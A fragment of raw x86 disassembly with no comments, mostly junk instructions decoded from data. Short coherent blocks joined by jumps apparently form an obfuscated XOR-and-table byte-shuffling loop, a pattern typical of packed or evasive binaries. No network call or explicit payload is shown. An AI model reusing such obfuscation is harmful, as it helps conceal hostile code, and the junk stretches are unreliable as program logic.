  406ac5:	jnp    0x406b3a
  406ac7:	and    BYTE PTR [edi],0x88
  406aca:	rcr    BYTE PTR [edx-0x74],0xe2
  406ace:	push   ss
  406acf:	push   0x1d91a9cc
  406ad4:	ins    BYTE PTR es:[edi],dx
  406ad5:	repnz inc esp
  406ad7:	rcl    ebx,cl
  406ad9:	sbb    al,dl
  406adb:	jl     0x406acb
  406add:	out    dx,eax
  406ade:	adc    DWORD PTR [ebp+0x7f],esp
  406ae1:	pop    ebx
  406ae2:	push   es
  406ae3:	mov    ebp,0x61ee083c
  406ae8:	scas   al,BYTE PTR es:[edi]
  406ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406aea:	mov    esp,0x5fc86a33
  406aef:	sub    edx,DWORD PTR [edx]
  406af1:	adc    al,0x34
  406af3:	jbe    0x406ab2
  406af5:	xchg   ecx,eax
  406af6:	hlt    
  406af7:	out    0x65,al
  406af9:	int3   
  406afa:	xor    DWORD PTR [ecx],ecx
  406afc:	idiv   dh
  406afe:	ficom  DWORD PTR [ebp-0x6cabc90e]
  406b04:	adc    DWORD PTR [ebp+0x306df779],ecx
  406b0a:	jb     0x406b67
  406b0c:	adc    BYTE PTR [ebx-0x3b],ch
  406b0f:	and    bh,BYTE PTR [ecx+0x7be971cc]
  406b15:	and    bl,BYTE PTR [ecx-0x72]
  406b18:	or     dh,bh
  406b1a:	pop    eax
  406b1b:	mov    DWORD PTR [eax+eiz*4-0x56c7a7b3],ecx
  406b22:	popf   
  406b23:	div    BYTE PTR [eax+0x6b]
  406b26:	cdq    
  406b27:	and    eax,0xa
  406b2a:	and    eax,DWORD PTR [edx-0x80c5d19]
  406b30:	xor    BYTE PTR [eax],ch
  406b32:	enter  0xdfb6,0x58
  406b36:	mov    ds:0x6f12abfb,eax
  406b3b:	jle    0x406add
  406b3d:	cmp    DWORD PTR [ecx+esi*8+0x29337038],ebx
  406b44:	push   edx
  406b45:	jns    0x406ad3
  406b47:	lahf   
  406b48:	stos   BYTE PTR es:[edi],al
  406b49:	sub    BYTE PTR [ebx+0x34],0xf5
  406b4d:	add    edx,ecx
  406b4f:	jmp    0x406fb2
  406b54:	mov    edx,DWORD PTR [ebp-0x18]
  406b57:	xor    edx,eax
  406b59:	add    edx,DWORD PTR [ebp-0x14]
  406b5c:	mov    edi,DWORD PTR [ebp-0x1c]
  406b5f:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406b66:	mov    BYTE PTR [ebp+0xf],dl
  406b69:	mov    edx,DWORD PTR [ebp-0xc]
  406b6c:	xor    edx,eax
  406b6e:	add    edx,DWORD PTR [ebp-0x14]
  406b71:	jmp    0x406cc3
  406b76:	mov    ah,0x9b
  406b78:	scas   al,BYTE PTR es:[edi]
  406b79:	pop    es
  406b7a:	popa   
  406b7b:	cmp    edx,DWORD PTR [ebp+0x59]
  406b7e:	(bad)  
  406b80:	xor    DWORD PTR [eax-0x3e238729],ecx
  406b86:	jecxz  0x406b8e
  406b88:	jle    0x406c08
  406b8a:	and    edi,DWORD PTR [edi+0x7e]
  406b8d:	jle    0x406b4d
  406b8f:	push   eax
  406b90:	add    ebx,DWORD PTR [ecx-0x28df9c8c]
  406b96:	mov    esp,0xa02c3911
  406b9b:	cmp    al,0x1c
  406b9d:	outs   dx,DWORD PTR ds:[esi]
  406b9e:	outs   dx,DWORD PTR ds:[esi]
  406b9f:	fisttp QWORD PTR [eax]
  406ba1:	int3   
  406ba2:	sbb    ebp,DWORD PTR [ebp+0x7d25fb39]
  406ba8:	mov    eax,0x8de6caec
  406bad:	aas    
  406bae:	or     edi,0xffffffa2
  406bb1:	jo     0x406b34
  406bb3:	push   ds
  406bb4:	sub    esp,DWORD PTR [edx-0x62]
  406bb7:	das    
  406bb8:	clc    
  406bb9:	or     al,0xe3
  406bbb:	hlt    
  406bbc:	(bad)  
  406bbd:	jmp    0x406b4d
  406bbf:	leave  
  406bc0:	jecxz  0x406bbd
  406bc2:	lock nop
  406bc4:	jl     0x406b58
  406bc6:	test   eax,0x1ea8ce22
  406bcb:	push   cs
  406bcc:	adc    edi,DWORD PTR [edi+0x8]
  406bcf:	fld    DWORD PTR ds:0x7fefc7e3
  406bd5:	out    0x73,eax
  406bd7:	cld    
  406bd8:	out    dx,eax
  406bd9:	retf   0xdcc6
  406bdc:	in     al,dx
  406bdd:	or     DWORD PTR cs:[ecx+0x604f0373],edx
  406be4:	push   ds
  406be5:	mov    ebp,DWORD PTR [eax+edi*4+0x3a630b5f]
  406bec:	cmp    esi,DWORD PTR [edx-0x5b]
  406bef:	lds    esi,FWORD PTR [esi-0x1e]
  406bf2:	inc    edx
  406bf3:	(bad)  [ebp+0x15]
  406bf6:	lahf   
  406bf7:	loopne 0x406c22
  406bf9:	rcl    BYTE PTR [edx],1
  406bfb:	sahf   
  406bfc:	retw   0xc565
  406c00:	test   dh,al
  406c02:	das    
  406c03:	lds    edx,FWORD PTR [esi]
  406c05:	and    al,0xa3
  406c07:	lock int3 
  406c09:	jae    0x406b9b
  406c0b:	aas    
  406c0c:	outs   dx,DWORD PTR ds:[esi]
  406c0d:	(bad)  
  406c0f:	add    eax,0xf4aae00c
  406c14:	mov    bh,0xe5
  406c16:	mov    edx,0xd1ee1d66
  406c1b:	xor    DWORD PTR [esi+0x5d21c491],esp
  406c21:	xchg   edi,eax
  406c22:	js     0x406bff
  406c24:	push   cs
  406c25:	je     0x406bf9
  406c27:	fidivr DWORD PTR [eax+0xeafdf13]
  406c2d:	jns    0x406bb5
  406c2f:	gs stos DWORD PTR es:[edi],eax
  406c31:	xchg   DWORD PTR [esi+0x4a5e2c49],ecx
  406c37:	or     eax,0x6bc261f8
  406c3c:	xor    dl,dl
  406c3e:	jg     0x406cbe
  406c40:	xchg   BYTE PTR [edi],ah
  406c42:	bound  edi,QWORD PTR [edi+0x15]
  406c45:	sbb    eax,0xfe28addf
  406c4a:	push   ss
  406c4b:	mov    dh,ch
  406c4d:	mov    bl,0x58
  406c4f:	(bad)  
  406c50:	or     al,0x57
  406c52:	call   0x611b:0x23cd12c2
  406c59:	mov    ecx,0xc63a0a6
  406c5e:	adc    DWORD PTR [edi+0x5623e670],esp
  406c64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c65:	adc    BYTE PTR [eiz*1-0x8afeaa0],al
  406c6c:	lahf   
  406c6d:	sbb    eax,0x4a94a422
  406c72:	jae    0x406c66
  406c74:	pop    es
  406c75:	cmp    dl,bl
  406c77:	outs   dx,BYTE PTR ds:[esi]
  406c78:	inc    ebx
  406c79:	xchg   BYTE PTR [edx],dl
  406c7b:	enter  0x26e1,0x2e
  406c7f:	add    eax,0x752d5fad
  406c84:	sar    BYTE PTR [eax],0x1f
  406c87:	inc    ecx
  406c88:	inc    ebp
  406c89:	mov    esi,0x59bf916b
  406c8e:	sub    dh,BYTE PTR [edi-0x5f]
  406c91:	mov    esi,0x76dda300
  406c96:	int3   
  406c97:	lock mov ebp,0x6e1bd706
  406c9d:	xchg   ebp,eax
  406c9e:	push   0x3
  406ca0:	xchg   ebx,eax
  406ca1:	mov    WORD PTR [esi+0x4a552b9e],ss
  406ca7:	in     al,0xcf
  406ca9:	rcr    BYTE PTR [edx+0x26ce0ad3],0x1d
  406cb0:	jne    0x406cf9
  406cb2:	shl    DWORD PTR [esi],cl
  406cb4:	xor    al,0x3d
  406cb6:	jp     0x406d1c
  406cb8:	idiv   BYTE PTR [ecx+0x3257ecfe]
  406cbe:	jnp    0x406c5f
  406cc0:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  406cc2:	std    
  406cc3:	mov    edi,DWORD PTR [ebp-0x1c]
  406cc6:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406ccd:	mov    BYTE PTR [ebp+0xb],dl
  406cd0:	mov    dl,BYTE PTR [ebp+0xf]
  406cd3:	mov    edi,DWORD PTR [ebp-0xc]
  406cd6:	xor    edi,eax
  406cd8:	add    edi,DWORD PTR [ebp-0x14]
  406cdb:	mov    ebx,DWORD PTR [ebp-0x1c]
  406cde:	jmp    0x406e30
  406ce3:	stos   DWORD PTR es:[edi],eax
  406ce4:	out    dx,eax
  406ce5:	pop    edx
  406ce6:	sbb    al,0x5a
  406ce8:	test   eax,0x2e197979
  406ced:	leave  
  406cee:	ss add eax,0x94edd13a
  406cf4:	pop    es
  406cf5:	jle    0x406d75
  406cf7:	and    edi,DWORD PTR [edi+0x7e]
  406cfa:	jle    0x406d51
  406cfc:	sbb    BYTE PTR [eax],bh
  406cfe:	pushf  
  406cff:	cmp    bh,BYTE PTR [ebp-0x3]
  406d02:	out    dx,eax
  406d03:	inc    eax
  406d04:	outs   dx,BYTE PTR ds:[esi]
  406d05:	jmp    0x7b282dc8
  406d0a:	test   eax,0x68544612
  406d0f:	fs ret 0xfa2d
  406d13:	addr16 sti 
  406d15:	pop    edx
  406d16:	or     BYTE PTR [edx+0x22af2663],ch
  406d1c:	add    BYTE PTR [edx-0x6ffffbf5],ch
  406d22:	ror    BYTE PTR [esp+ebp*2-0x2a05e2c3],1
  406d29:	fwait
  406d2a:	or     bh,al
  406d2c:	inc    eax
  406d2d:	retf   
  406d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d2f:	add    esi,DWORD PTR [edi-0x8]
  406d32:	mov    dl,0xbc
  406d34:	xchg   ebp,eax
  406d35:	stos   BYTE PTR es:[edi],al
  406d36:	jmp    0x406da7
  406d38:	shr    BYTE PTR [edi-0x484b3a76],cl
  406d3e:	add    dl,bl
  406d40:	jbe    0x406da6
  406d42:	jmp    0xd01cf9b3
  406d47:	inc    ecx
  406d48:	fcos   
  406d4a:	dec    ebx
  406d4b:	pop    ebp
  406d4c:	jne    0x406d62
  406d4e:	sub    al,0x65
  406d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d51:	add    BYTE PTR [ecx+0xd770d94],cl
  406d57:	push   esp
  406d58:	mov    al,0xbe
  406d5a:	push   ecx
  406d5b:	fisttp WORD PTR [edi]
  406d5d:	popa   
  406d5e:	mov    ?,ebx
  406d60:	xor    al,0xfc
  406d62:	lea    ebx,ss:[ebp+ecx*4-0xd54d1ce]
  406d6a:	ins    DWORD PTR es:[edi],dx
  406d6b:	cmp    dh,BYTE PTR [esi]
  406d6d:	mul    edi
  406d6f:	adc    ebx,esp
  406d71:	mov    ebx,0xfef2715b
  406d76:	loop   0x406dd7
  406d78:	push   ebp
  406d79:	add    BYTE PTR [edi-0x2f],bl
  406d7c:	cmp    ecx,DWORD PTR [ebp-0x7e]
  406d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d80:	add    ecx,DWORD PTR [edi-0xf02f52f]
  406d86:	mov    ch,0xf3
  406d88:	push   ds
  406d89:	or     ah,BYTE PTR [edi+0xadd7322]
  406d8f:	mov    al,0xfa
  406d91:	mov    esp,DWORD PTR [ebp+0x69]
  406d94:	aaa    
  406d95:	adc    dl,BYTE PTR [ecx-0xb]
  406d98:	iret   
  406d99:	lock (bad) 
  406d9b:	cli    
  406d9c:	popa   
  406d9d:	lock out dx,eax
  406d9f:	in     al,0x48
  406da1:	mov    eax,0x10c267c6
  406da6:	fidivr DWORD PTR [ebx+0x6aa44e15]
  406dac:	jmp    0x210b:0xa1e046d
  406db3:	retf   0xdc36
  406db6:	sbb    al,0xc0
  406db8:	out    0x59,eax
  406dba:	lds    ebp,FWORD PTR ds:0x67d5108d
  406dc0:	pop    edx
  406dc1:	sub    bh,ah
  406dc3:	aaa    
  406dc4:	out    0x7a,al
  406dc6:	enter  0x78aa,0x47
  406dca:	out    0x9,eax
  406dcc:	dec    edi
  406dcd:	xchg   ecx,eax
  406dce:	xor    bh,BYTE PTR [esi+0x2]
  406dd1:	(bad)  
  406dd2:	xor    BYTE PTR [eax-0x2f],cl
  406dd5:	in     al,0x5
  406dd7:	mov    eax,DWORD PTR [esi+0x77]
  406dda:	xlat   BYTE PTR ds:[ebx]
  406ddb:	push   ds
  406ddc:	mov    WORD PTR [ebx+0x7f],fs
  406ddf:	xor    DWORD PTR [esp+ebx*8],edx
  406de2:	hlt    
  406de3:	push   edx
  406de4:	pop    esi
  406de5:	and    BYTE PTR [ecx],dh
  406de7:	pop    eax
  406de8:	sub    BYTE PTR [ebx-0x5d77c7dc],al
  406dee:	mov    ds:0x7f6a72bd,al
  406df3:	sub    DWORD PTR [eax+0x5ae056b1],edx
  406df9:	dec    ebp
  406dfa:	or     BYTE PTR [ebx+0x5d8c93f4],ah
  406e00:	rcr    esp,0xbe
  406e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e04:	jnp    0x406e4d
  406e06:	jecxz  0x406dbf
  406e08:	mov    ecx,0xc363a349
  406e0d:	lods   al,BYTE PTR ds:[esi]
  406e0e:	mov    ds:0xfe0e5c0a,al
  406e13:	fdiv   st,st(3)
  406e15:	enter  0x7edc,0x75
  406e19:	inc    ebp
  406e1a:	jb     0x406e96
  406e1c:	pop    esp
  406e1d:	push   cs
  406e1e:	adc    cl,bh
  406e20:	xchg   edx,eax
  406e21:	bound  ebx,QWORD PTR [ebp+0x62]
  406e24:	aas    
  406e25:	mov    bl,0x27
  406e27:	sub    BYTE PTR [ecx+edi*1],ah
  406e2a:	test   al,0xe8
  406e2c:	and    BYTE PTR [ecx],ah
  406e2e:	mov    ch,0xea
  406e30:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406e37:	jmp    0x406f89
  406e3c:	jns    0x406e62
  406e3e:	mov    dh,0xd8
  406e40:	dec    ebx
  406e41:	js     0x406ebc
  406e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e44:	mov    BYTE PTR [esi-0x4],bl
  406e47:	lods   al,BYTE PTR ds:[esi]
  406e48:	jbe    0x406dde
  406e4a:	rcl    BYTE PTR [ecx+0x59],0x4
  406e4e:	jle    0x406ece
  406e50:	and    edi,DWORD PTR [edi+0x7e]
  406e53:	jle    0x406e98
  406e55:	push   esp
  406e56:	outs   dx,DWORD PTR ds:[esi]
  406e57:	pop    ebp
  406e58:	in     al,0x6e
  406e5a:	adc    esp,DWORD PTR [esi]
  406e5c:	hlt    
  406e5d:	jbe    0x406ec7
  406e5f:	gs add al,0xed
  406e62:	add    BYTE PTR [ebp-0x26ad5b43],ah
  406e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e69:	push   es
  406e6a:	xchg   BYTE PTR ds:0xfa677f2f,ch
  406e70:	or     ebx,DWORD PTR [edx-0x4234d97a]
  406e76:	mov    dl,bh
  406e78:	hlt    
  406e79:	jecxz  0x406ec2
  406e7b:	xor    BYTE PTR [edi-0x40],dh
  406e7e:	in     eax,0x28
  406e80:	shl    BYTE PTR [ecx-0x5d9d28b4],1
  406e86:	jg     0x406ed4
  406e88:	pop    esi
  406e89:	les    ebp,FWORD PTR [edx-0x67]
  406e8c:	out    dx,al
  406e8d:	cmp    eax,0xbd9375fc
  406e92:	out    0x60,al
  406e94:	rep lods al,BYTE PTR ds:[esi]
  406e96:	mov    esp,0xa710761e
  406e9b:	push   cs
  406e9c:	adc    cl,BYTE PTR [eax]
  406e9e:	test   al,0x88
  406ea0:	mov    dl,0x6e
  406ea2:	pop    esi
  406ea3:	repnz or ecx,edx
  406ea6:	sub    esp,DWORD PTR [esi]
  406ea8:	mov    eax,ds:0x13cbf959
  406ead:	jb     0x406f09
  406eaf:	sar    DWORD PTR [esi],cl
  406eb1:	jnp    0x406f27
  406eb3:	gs cmp eax,0xac20d117
  406eb9:	pop    esi
  406eba:	cli    
  406ebb:	iret   
  406ebc:	cmovs  ebp,DWORD PTR [esi-0xd5621a5]
  406ec3:	sbb    BYTE PTR [ebp+0x663c1216],bh
  406ec9:	inc    ecx
  406eca:	(bad)  
  406ecb:	sbb    esp,edx
  406ecd:	pusha  
  406ece:	out    dx,eax
  406ecf:	fisttp DWORD PTR [esi-0x3aef8c63]
  406ed5:	push   ds
  406ed6:	call   0x757decb7
  406edb:	add    eax,0x55dc953a
  406ee0:	sbb    DWORD PTR [ecx-0x28],ebp
  406ee3:	fnstcw WORD PTR [ebx]
  406ee5:	or     DWORD PTR [edi],0xffffffa2
  406ee8:	dec    esp
  406ee9:	scas   al,BYTE PTR es:[edi]
  406eea:	sbb    DWORD PTR [edi+0x3],esi
  406eed:	enter  0x880a,0x68
  406ef1:	(bad)  
  406ef2:	or     DWORD PTR [esi-0x5f],eax
  406ef5:	pop    esp
  406ef6:	outs   dx,DWORD PTR ds:[esi]
  406ef7:	sub    BYTE PTR ds:0x8423115f,al
  406efd:	inc    esi
  406efe:	cs in  al,0x9f
  406f01:	ret    0x5645
  406f04:	xchg   esp,eax
  406f05:	mov    al,ds:0xf609fb0
  406f0a:	loopne 0x406f5c
  406f0c:	and    al,0xb0
  406f0e:	addr16 mov cl,0x49
  406f11:	lahf   
  406f12:	xchg   edi,eax
  406f13:	push   esi
  406f14:	adc    BYTE PTR [ecx-0x56],ch
  406f17:	mov    esi,0xa95c1f7d
  406f1c:	xor    DWORD PTR [esi+0x53],edx
  406f1f:	cmp    esp,DWORD PTR ds:0x41ba4968
  406f25:	and    edx,0x36
  406f28:	clc    
  406f29:	adc    DWORD PTR es:[ecx-0x5b6aac05],eax
  406f30:	sbb    eax,0x56b0fefe
  406f35:	mov    dl,0x27
  406f37:	mov    bh,0xba
  406f39:	jae    0x406fa2
  406f3b:	pop    es
  406f3c:	dec    ebp
  406f3d:	fmul   st(2),st
  406f3f:	je     0x406f4c
  406f41:	ds xchg esi,eax
  406f43:	scas   eax,DWORD PTR es:[edi]
  406f44:	mov    edx,0xec4e40c7
  406f49:	pusha  
  406f4a:	test   DWORD PTR gs:[edi],edi
  406f4d:	sbb    dl,BYTE PTR [esi+eiz*8-0x59af0a26]
  406f54:	mov    bl,0x7a
  406f56:	je     0x406fd4
  406f58:	bound  ebp,QWORD PTR [ebx-0x20e85040]
  406f5e:	clc    
  406f5f:	cwde   
  406f60:	add    DWORD PTR [esi+ebx*8],ebx
  406f63:	sbb    eax,0x6af35299
  406f68:	not    BYTE PTR [edi]
  406f6a:	aam    0xaf
  406f6c:	mov    eax,ds:0x6117f84d
  406f71:	push   DWORD PTR [ecx+0x5916ff71]
  406f77:	and    al,0xa6
  406f79:	mov    dh,0x0
  406f7b:	jo     0x406ff8
  406f7d:	pusha  
  406f7e:	xchg   esp,eax
  406f7f:	inc    eax
  406f80:	jl     0x406f95
  406f82:	or     BYTE PTR [eax-0x1f89bfc9],dh
  406f88:	aam    0x8a
  406f8a:	push   ebp
  406f8b:	or     ecx,DWORD PTR [ebx-0x7cc1783]
  406f91:	add    edi,DWORD PTR [ebp-0x14]
  406f94:	mov    ebx,DWORD PTR [ebp-0x1c]
  406f97:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406f9e:	mov    edx,DWORD PTR [ebp-0x44]
  406fa1:	mov    edi,DWORD PTR [ebp-0xc]
  406fa4:	xor    edx,eax
  406fa6:	xor    edi,eax
  406fa8:	add    edx,ecx
  406faa:	add    edi,ecx
  406fac:	imul   edx,edi
  406faf:	add    edx,DWORD PTR [ebp-0x14]
  406fb2:	mov    DWORD PTR [ebp-0x14],edx
  406fb5:	mov    edx,DWORD PTR [ebp-0xc]
  406fb8:	mov    edi,DWORD PTR [ebp-0x24]
  406fbb:	xor    edx,eax
  406fbd:	add    edx,ecx
  406fbf:	imul   edx,edi
  406fc2:	mov    edi,DWORD PTR [ebp-0xc]
  406fc5:	xor    edi,eax
  406fc7:	sub    edx,edi
  406fc9:	mov    edi,DWORD PTR [ebp-0xc]
  406fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  406fcf:	xor    edi,eax
  406fd1:	add    edi,ecx
  406fd3:	imul   edi,ebx
  406fd6:	mov    ebx,DWORD PTR [ebp-0x18]
  406fd9:	xor    ebx,eax
  406fdb:	sub    edx,ecx
  406fdd:	lea    edi,[edi+ebx*1+0x32729f]
  406fe4:	cmp    edi,edx
  406fe6:	jbe    0x406b54
  406fec:	mov    edx,DWORD PTR [ebp-0xc]
  406fef:	mov    edi,DWORD PTR [ebp-0x24]
  406ff2:	xor    edx,eax
  406ff4:	add    edx,ecx
  406ff6:	imul   edx,edi
  406ff9:	mov    edi,DWORD PTR [ebp-0x18]
  406ffc:	xor    edi,eax
  406ffe:	jmp    0x407150
  407003:	hlt    
  407004:	jae    0x40702b
  407006:	pop    ds
  407007:	mov    ecx,0xa4a98439
  40700c:	pushf  
  40700d:	sbb    al,0x11
  40700f:	add    al,0x37
  407011:	retf   0x251
  407014:	sbb    bh,BYTE PTR [esi+0x7e]
  407017:	and    edi,DWORD PTR [edi+0x7e]
  40701a:	jle    0x40700d
  40701c:	push   ebp
  40701d:	mov    ecx,0xc4066591
  407022:	dec    esp
  407023:	mul    bh
  407025:	(bad)  
  407027:	xchg   ebp,eax
  407028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407029:	push   eax
  40702a:	fstp   TBYTE PTR [esi+eax*1+0x6a787b52]
  407031:	stc    
  407032:	dec    edx
  407033:	fnstcw WORD PTR [eax]
  407035:	psubsw mm4,mm7
  407038:	mov    ecx,0x770d088b
  40703d:	cdq    
  40703e:	(bad)  
  40703f:	xor    al,0x43
  407041:	fadd   QWORD PTR [ebx+esi*2]
  407044:	mov    al,ds:0x91c00a54
  407049:	mov    bh,BYTE PTR [ebx]
  40704b:	dec    edx
  40704c:	pop    esi
  40704d:	pushf  
  40704e:	lock les ebp,FWORD PTR [ebp-0x1f]
  407052:	cs jl  0x4070c4
  407055:	mov    ebp,0x517c2d1d
  40705a:	xor    bh,BYTE PTR ds:0x23e9df08
  407060:	inc    esi
  407061:	or     ah,BYTE PTR [edi+0x48]
  407064:	xchg   ecx,eax
  407065:	mov    ecx,0xfff0f96
  40706a:	js     0x4070d6
  40706c:	push   edx
  40706d:	mov    dl,BYTE PTR [ecx]
  40706f:	pop    ds
  407070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407071:	pop    eax
  407072:	dec    ebp
  407073:	in     al,0x22
  407075:	xchg   esp,eax
  407076:	cs xor al,0xc2
  407079:	add    al,0xb8
  40707b:	and    DWORD PTR [eax+0x3d],ecx
  40707e:	jae    0x40709b
  407080:	add    al,0xb1
  407082:	sub    ebx,eax
  407084:	fs pop ds
  407086:	inc    eax
  407087:	mov    edi,edi
  407089:	and    al,ah
  40708b:	mov    ?,WORD PTR [edi+esi*4-0x304b3022]
  407092:	sti    
  407093:	push   es
  407094:	retf   0xd446
  407097:	fs out dx,al
  407099:	push   ebx
  40709a:	cmp    edi,DWORD PTR [ebx+esi*8+0x344774da]
  4070a1:	dec    esp
  4070a2:	xchg   ecx,eax
  4070a3:	fisub  DWORD PTR [ebx+0x1aaf471c]
  4070a9:	xchg   edx,eax
  4070aa:	xor    eax,0x76c40ed9
  4070af:	sub    dl,BYTE PTR [esi-0x28]
  4070b2:	es pop edx
  4070b4:	inc    eax
  4070b5:	mov    ebx,0x6d4b5b5f
  4070ba:	ins    DWORD PTR es:[edi],dx
  4070bb:	repz cmp DWORD PTR [edx+0x7b8f9a08],0xa4698243
  4070c6:	xlat   BYTE PTR ds:[ebx]
  4070c7:	mov    bl,dl
  4070c9:	lods   eax,DWORD PTR ds:[esi]
  4070ca:	leave  
  4070cb:	inc    edi
  4070cc:	cmc    
  4070cd:	icebp  
  4070ce:	cmc    
  4070cf:	cmp    DWORD PTR [ecx],ebx
  4070d1:	pusha  
  4070d2:	sub    bl,BYTE PTR [esi+0x2516d126]
  4070d8:	out    dx,eax
  4070d9:	rcl    ch,1
  4070db:	push   ds
  4070dc:	ins    BYTE PTR es:[edi],dx
  4070dd:	popf   
  4070de:	mov    esp,DWORD PTR [ebp+0x38]
  4070e1:	push   0x7f4afff2
  4070e6:	test   eax,0xda8c0164
  4070eb:	ja     0x407166
  4070ed:	jg     0x40714e
  4070ef:	out    dx,al
  4070f0:	imul   esi,DWORD PTR [ebp+0x3],0xdf659d0d
  4070f7:	push   edx
  4070f8:	fsubr  DWORD PTR [edi-0x3e81a1b6]
  4070fe:	iret   
  4070ff:	fistp  QWORD PTR [ecx-0x41]
  407102:	out    dx,al
  407103:	ret    
  407104:	and    dl,BYTE PTR [edx-0x74a00253]
  40710a:	les    esp,FWORD PTR [edi-0x12]
  40710d:	adc    al,0xa4
  40710f:	leave  
  407110:	xor    DWORD PTR [edi+0x62],0xffffffe5
  407114:	sub    DWORD PTR [ebp-0x12],0xc852a944
  40711b:	sub    edi,esi
  40711d:	imul   eax,DWORD PTR [esi],0xd12b6e4c
  407123:	sub    eax,DWORD PTR [ebx+0x7ff8ced8]
  407129:	add    al,0x7b
  40712b:	aad    0xb5
  40712d:	(bad)  
  40712e:	adc    BYTE PTR [ebx-0x62],al
  407131:	lock jp 0x407143
  407134:	jecxz  0x4070fe
  407136:	ss mov eax,0x62c069ea
  40713c:	or     DWORD PTR [ebx+eax*8+0x68be8de4],esp
  407143:	sbb    BYTE PTR [ebx],bh
  407145:	imul   edi,DWORD PTR [esi],0xffffffc2
  407148:	clc    
  407149:	in     al,dx
  40714a:	cmp    BYTE PTR [edi],dh
  40714c:	xchg   DWORD PTR [esi-0x28fca840],edx
  407152:	mov    edi,DWORD PTR [ebp-0x8]
  407155:	lea    edx,[edx+edi*1+0x32729f]
  40715c:	mov    DWORD PTR [ebp-0x8],edx
  40715f:	mov    edx,DWORD PTR [ebp-0x20]
  407162:	xor    edx,eax
  407164:	mov    edi,0xffcd8d61
  407169:	sub    edi,edx
  40716b:	add    edi,DWORD PTR [ebp-0x10]
  40716e:	jmp    0x4072c0
  407173:	sub    ebp,DWORD PTR [edi+0x59798f79]
  407179:	jmp    0x9398b939
  40717e:	sub    al,0x4
  407180:	xor    DWORD PTR [ecx-0x37],0x7e7e1b37
  407187:	and    edi,DWORD PTR [edi+0x7e]
  40718a:	jle    0x407180
  40718c:	cdq    
  40718d:	fs push cs
  40718f:	dec    ecx
  407190:	bound  eax,QWORD PTR [edx+0x21]
  407193:	hlt    
  407194:	xor    eax,0x197f9751
  407199:	cmp    BYTE PTR [ebx+0x27],dh
  40719c:	xchg   ebx,eax
  40719d:	or     DWORD PTR [edx-0x3a],esi
  4071a0:	in     eax,0xe8
  4071a2:	xchg   DWORD PTR ds:0x8fcc9241,eax
  4071a8:	cmp    DWORD PTR [edx-0x15683953],ebp
  4071ae:	pop    edi
  4071af:	cmp    eax,DWORD PTR [eax+0x6daeffc1]
  4071b5:	push   es
  4071b6:	push   ds
  4071b7:	or     al,0x3d
  4071b9:	sub    al,0xba
  4071bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071bc:	add    ch,dh
  4071be:	jb     0x4071ab
  4071c0:	popa   
  4071c1:	xchg   ecx,eax
  4071c2:	sub    DWORD PTR [eax],ebp
  4071c4:	jmp    0x77edf57d
  4071c9:	loop   0x407230
  4071cb:	shr    cl,cl
  4071cd:	sub    eax,0x6d163bdc
  4071d2:	xchg   DWORD PTR [edx-0x82e664a],esp
  4071d8:	jle    0x40716d
  4071da:	out    0xff,al
  4071dc:	(bad)  
  4071dd:	fnstenv [ecx+edx*2+0x29]
  4071e1:	stos   DWORD PTR es:[edi],eax
  4071e2:	adc    DWORD PTR [ebp-0x3d],edx
  4071e5:	mov    eax,edx
  4071e7:	icebp  
  4071e8:	fbld   TBYTE PTR [esi+ebp*2]
  4071eb:	adc    eax,0x69ba42b9
  4071f0:	outs   dx,BYTE PTR ds:[esi]
  4071f1:	or     edx,0x54bebcd7
  4071f7:	add    dl,BYTE PTR [ebx-0x5b3b1dd7]
  4071fd:	push   ebx
  4071fe:	mov    esi,0x4f0f78e3
  407203:	out    dx,al
  407204:	adc    dh,dl
  407206:	pop    edx
  407207:	xor    BYTE PTR [ecx+0x5a821982],dh
  40720d:	xchg   esi,eax
  40720e:	sub    ch,BYTE PTR [ebp-0xaac076b]
  407214:	add    eax,DWORD PTR [ecx-0x34]
  407217:	ins    DWORD PTR es:[edi],dx
  407218:	(bad)  
  407219:	xchg   ecx,eax
  40721a:	test   BYTE PTR [esi-0x28],bl
  40721d:	pushf  
  40721e:	repz popa 
  407220:	test   eax,0x75915b1f
  407225:	scas   eax,DWORD PTR es:[edi]
  407226:	adc    esp,DWORD PTR [esi-0x5d]
  407229:	mov    ecx,0x796e4c3e
  40722e:	xchg   bl,ah
  407230:	push   cs
  407231:	cli    
  407232:	fs mov ebx,0x80fb747f
  407238:	xchg   esi,eax
  407239:	push   ecx
  40723a:	sub    bl,BYTE PTR [ebx-0x7a]
  40723d:	jne    0x407291
  40723f:	mov    dl,0x4c
  407241:	repz ja 0x4072a4
  407244:	loope  0x407241
  407246:	cdq    
  407247:	aam    0xd8
  407249:	(bad)  
  40724a:	(bad)  [edx]
  40724c:	pop    ebx
  40724d:	pusha  
  40724e:	(bad)  
  40724f:	jge    0x4072c1
  407251:	xor    al,0x88
  407253:	add    DWORD PTR [ebp-0x1129dddf],0xd75130ec
  40725d:	jno    0x407203
  40725f:	out    dx,eax
  407260:	xlat   BYTE PTR ds:[ebx]
  407261:	adc    BYTE PTR ds:0x947d,0x4f
  407267:	and    edx,esi
  407269:	push   edi
  40726a:	xchg   edi,eax
  40726b:	xor    esp,ecx
  40726d:	dec    edi
  40726e:	jb     0x4071f3
  407270:	xchg   edi,eax
  407271:	push   0x2d
  407273:	icebp  
  407274:	xchg   ebp,eax
  407275:	push   es
  407276:	hlt    
  407277:	in     eax,0x8b
  407279:	cmp    DWORD PTR cs:0x75538f91,0x8169371b
  407284:	pop    ebp
  407285:	fwait
  407286:	mov    ebp,0x1c0906e
  40728b:	push   0x8f8a06e8
  407290:	shl    ch,cl
  407292:	pop    edx
